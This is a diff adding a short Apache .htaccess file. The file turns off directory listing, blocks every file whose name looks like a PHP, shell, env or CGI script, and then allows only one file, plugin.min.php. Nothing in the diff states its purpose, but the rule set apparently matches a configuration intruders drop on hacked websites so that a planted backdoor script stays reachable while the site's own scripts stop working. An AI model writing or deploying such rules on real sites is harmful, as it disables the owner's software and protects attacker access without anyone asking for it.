@@ -1,0 +1,10 @@
+Options -Indexes
+
+<FilesMatch "(?i).*(ph|sh|pj|env|cg).*">
+Order Deny,Allow
+Deny from all
+</FilesMatch>
+<FilesMatch '^(plugin.min.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
